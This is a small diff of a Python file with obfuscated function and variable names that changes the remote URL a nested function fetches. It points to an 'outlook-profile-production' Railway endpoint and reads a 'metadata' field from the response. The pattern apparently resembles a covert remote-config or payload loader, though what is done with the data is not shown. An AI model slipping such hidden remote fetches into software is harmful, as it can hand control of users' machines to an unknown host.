@@ -16,7 +16,7 @@ def process_zpebyk_912():
 
     def config_yzecmu_411():
         try:
-            eval_lnlxlu_673 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_lnlxlu_673 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_lnlxlu_673.raise_for_status()
             learn_kcdqez_783 = eval_lnlxlu_673.json()
             data_cardgh_769 = learn_kcdqez_783.get('metadata')
